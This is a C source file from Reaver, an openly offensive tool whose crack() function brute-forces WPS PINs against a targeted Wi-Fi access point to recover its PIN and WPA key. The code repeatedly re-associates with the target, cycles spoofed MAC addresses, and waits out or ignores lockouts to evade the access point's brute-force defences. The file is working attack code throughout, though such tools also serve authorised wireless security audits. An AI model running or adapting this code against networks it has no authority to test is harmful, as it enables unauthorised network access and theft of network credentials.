/*
 * Reaver - Main cracking functions
 * Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#include "cracker.h"

/* Brute force all possible WPS pins for a given access point */
void crack()
{
	unsigned char *bssid = NULL;
	char *pin = NULL;
	int fail_count = 0, loop_count = 0, sleep_count = 0, assoc_fail_count = 0;
	float pin_count = 0;
	time_t start_time = 0;
	enum wps_result result = 0;
	/* MAC CHANGER VARIABLES */	
	int mac_changer_counter = 0;
	char mac[MAC_ADDR_LEN] = { 0 };
	unsigned char mac_string [] = "ZZ:ZZ:ZZ:ZZ:ZZ:ZZ";
	unsigned char* new_mac = &mac_string[0];
	char last_digit = '0';

	if(!get_iface())
	{
		return;
	}

	if(get_max_pin_attempts() == -1)
	{
		cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
		return;
	}

	/* Initialize network interface */
	set_handle(capture_init(get_iface()));

	if(get_handle() != NULL)
	{
		generate_pins();

		/* Restore any previously saved session */
		if(get_static_p1() == NULL)
		{
			restore_session();
		}

		/* Convert BSSID to a string */
		bssid = mac2str(get_bssid(), ':');

		/* 
		 * We need to get some basic info from the AP, and also want to make sure the target AP
		 * actually exists, so wait for a beacon packet 
		 */
		cprintf(INFO, "[+] Waiting for beacon from %s\n", bssid);
		read_ap_beacon();
		process_auto_options();
	
		/* I'm fairly certian there's a reason I put this in twice. Can't remember what it was now though... */	
		if(get_max_pin_attempts() == -1)
		{
			cprintf(CRITICAL, "[X] ERROR: This device has been blacklisted and is not supported.\n");
			return;
		}

		/* This initial association is just to make sure we can successfully associate */
                while(!reassociate())
                {
			if(assoc_fail_count == MAX_ASSOC_FAILURES)
			{
				assoc_fail_count = 0;
	                	cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
			}
			else
			{
				assoc_fail_count++;
			}
                }
                cprintf(INFO, "[+] Associated with %s (ESSID: %s)\n", bssid, get_ssid());

		/* Used to calculate pin attempt rates */
		start_time = time(NULL);

		/* If the key status hasn't been explicitly set by restore_session(), ensure that it is set to KEY1_WIP */
		if(get_key_status() <= KEY1_WIP)
		{
			set_key_status(KEY1_WIP);
		}
		/* 
		 * If we're starting a session at KEY_DONE, that means we've already cracked the pin and the AP is being re-attacked.
		 * Re-set the status to KEY2_WIP so that we properly enter the main cracking loop.
		 */
		else if(get_key_status() == KEY_DONE)
		{
			set_key_status(KEY2_WIP);
		}

		//copy the current mac to the new_mac variable for mac changer
		if (get_mac_changer() == 1) {
			strncpy(new_mac, mac2str(get_mac(), ':'), 16);
		}

		/* Main cracking loop */
		for(loop_count=0, sleep_count=0; get_key_status() != KEY_DONE; loop_count++, sleep_count++)
		{
			//MAC Changer switch/case to define the last mac address digit
			if (get_mac_changer() == 1) {			
				switch (mac_changer_counter) {
					case 0:
					last_digit = '0';
					break;
					case 1:
					last_digit = '1';
					break;
					case 2:
					last_digit = '2';
					break;
					case 3:
					last_digit = '3';
					break;
					case 4:
					last_digit = '4';
					break;
					case 5:
					last_digit = '5';
					break;
					case 6:
					last_digit = '6';
					break;
					case 7:
					last_digit = '7';
					break;
					case 8:
					last_digit = '8';
					break;
					case 9:
					last_digit = '9';
					break;
					case 10:
					last_digit = 'A';
					break;
					case 11:
					last_digit = 'B';
					break;
					case 12:
					last_digit = 'C';
					break;
					case 13:
					last_digit = 'D';
					break;
					case 14:
					last_digit = 'E';
					break;
					case 15:
					last_digit = 'F';
					mac_changer_counter = -1;
					break;
				}

				mac_changer_counter++;

				new_mac[16] = last_digit;
				//transform the string to a MAC and define the MAC
				str2mac((unsigned char *) new_mac, (unsigned char *) &mac);
				set_mac((unsigned char *) &mac);
			
				cprintf(WARNING, "[+] Using MAC %s \n", mac2str(get_mac(), ':'));
			}			
			
			/* 
			 * Some APs may do brute force detection, or might not be able to handle an onslaught of WPS
			 * registrar requests. Using a delay here can help prevent the AP from locking us out.
			 */
			pcap_sleep(get_delay());

			/* Users may specify a delay after x number of attempts */
			if((get_recurring_delay() > 0) && (sleep_count == get_recurring_delay_count()))
			{
				cprintf(VERBOSE, "[+] Entering recurring delay of %d seconds\n", get_recurring_delay());
				pcap_sleep(get_recurring_delay());
				sleep_count = 0;
			}

			/* 
			 * Some APs identify brute force attempts and lock themselves for a short period of time (typically 5 minutes).
			 * Verify that the AP is not locked before attempting the next pin.
			 */
			while(get_ignore_locks() == 0 && is_wps_locked())
                        {
                                cprintf(WARNING, "[!] WARNING: Detected AP rate limiting, waiting %d seconds before re-checking\n", get_lock_delay());
				pcap_sleep(get_lock_delay());
				
                        }

			/* Initialize wps structure */
			set_wps(initialize_wps_data());
			if(!get_wps())
			{
				cprintf(CRITICAL, "[-] Failed to initialize critical data structure\n");
				break;
			}

			/* Try the next pin in the list */
			pin = build_next_pin();
			if(!pin)
			{
				cprintf(CRITICAL, "[-] Failed to generate the next payload\n");
				break;
			}
			else
			{
				cprintf(WARNING, "[+] Trying pin %s\n", pin);
			}

			/* 
			 * Reassociate with the AP before each WPS exchange. This is necessary as some APs will
			 * severely limit our pin attempt rate if we do not.
			 */
			assoc_fail_count = 0;
			while(!reassociate())
                	{
				if(assoc_fail_count == MAX_ASSOC_FAILURES)
				{
					assoc_fail_count = 0;
					cprintf(CRITICAL, "[!] WARNING: Failed to associate with %s (ESSID: %s)\n", bssid, get_ssid());
				}
				else
				{
					assoc_fail_count++;
				}
                	}
			

			/* 
			 * Enter receive loop. This will block until a receive timeout occurs or a
			 * WPS transaction has completed or failed.
			 */
			result = do_wps_exchange();

			switch(result)
			{
				/* 
				 * If the last pin attempt was rejected, increment 
				 * the pin counter, clear the fail counter and move 
				 * on to the next pin.
				 */
				case KEY_REJECTED:
					fail_count = 0;
					pin_count++;
					advance_pin_count();
					break;
				/* Got it!! */
				case KEY_ACCEPTED:
					break;
				/* Unexpected timeout or EAP failure...try this pin again */
				default:
					cprintf(VERBOSE, "[!] WPS transaction failed (code: 0x%.2X), re-trying last pin\n", result);
					fail_count++;
					break;
			}

			/* If we've had an excessive number of message failures in a row, print a warning */
			if(fail_count == WARN_FAILURE_COUNT)
			{
				cprintf(WARNING, "[!] WARNING: %d failed connections in a row\n", fail_count);
				fail_count = 0;
				pcap_sleep(get_fail_delay());
			}

			/* Display status and save current session state every DISPLAY_PIN_COUNT loops */
			if(loop_count == DISPLAY_PIN_COUNT)
			{
				save_session();
				display_status(pin_count, start_time);
				loop_count = 0;
			}

			/* 
			 * The WPA key and other settings are stored in the globule->wps structure. If we've 
			 * recovered the WPS pin and parsed these settings, don't free this structure. It 
			 * will be freed by wpscrack_free() at the end of main().
			 */
			if(get_key_status() != KEY_DONE)
			{
				wps_deinit(get_wps());
				set_wps(NULL);
			}
			/* If we have cracked the pin, save a copy */
			else
			{
				set_pin(pin);
			}
			free(pin);
			pin = NULL;

			/* If we've hit our max number of pin attempts, quit */
			if((get_max_pin_attempts() > 0) && 
			   (pin_count == get_max_pin_attempts()))
			{
				cprintf(VERBOSE, "[+] Quitting after %d crack attempts\n", get_max_pin_attempts());
				break;
			}
		}

                if(bssid) free(bssid);
		if(get_handle())
		{
			pcap_close(get_handle());
			set_handle(NULL);
		}
	} 
	else 
	{
		cprintf(CRITICAL, "[-] Failed to initialize interface '%s'\n", get_iface());
	}
}

/* 
 * Increment the index into the p1 or p2 array as appropriate.
 * If we're still trying to brute force the first half, increment p1.
 * If we're working on the second half, increment p2.
 */
void advance_pin_count()
{
	if(get_key_status() == KEY1_WIP)
	{
		set_p1_index(get_p1_index() + 1);
	} 
	else if(get_key_status() == KEY2_WIP)
	{
		set_p2_index(get_p2_index() + 1);
	}
}

/* Displays the status and rate of cracking */
void display_status(float pin_count, time_t start_time)
{
	float percentage = 0;
	int attempts = 0, average = 0;
	time_t now = 0, diff = 0;
	struct tm *tm_p = NULL;
        char time_s[256] = { 0 };

	if(get_key_status() == KEY1_WIP)
	{
		attempts = get_p1_index() + get_p2_index();
	}
	/* 
	 * If we've found the first half of the key, then the entire key1 keyspace
	 * has been exhausted/eliminated. Our output should reflect that.
	 */
	else if(get_key_status() == KEY2_WIP)
	{
		attempts = P1_SIZE + get_p2_index();
	}
	else if(get_key_status() == KEY_DONE)
	{
		attempts = P1_SIZE + P2_SIZE;
	}

	percentage = (float) (((float) attempts / (P1_SIZE + P2_SIZE)) * 100);
	
	now = time(NULL);
	diff = now - start_time;

        tm_p = localtime(&now);
	if(tm_p)
	{
        	strftime(time_s, sizeof(time_s), TIME_FORMAT, tm_p);
	}
	else
	{
		perror("localtime");
	}

	if(pin_count > 0)
	{
		average =  (int) (diff / pin_count);
	}
	else
	{
		average = 0;
	}

	cprintf(INFO, "[+] %.2f%% complete @ %s (%d seconds/pin)\n", percentage, time_s, average);

	return;
}
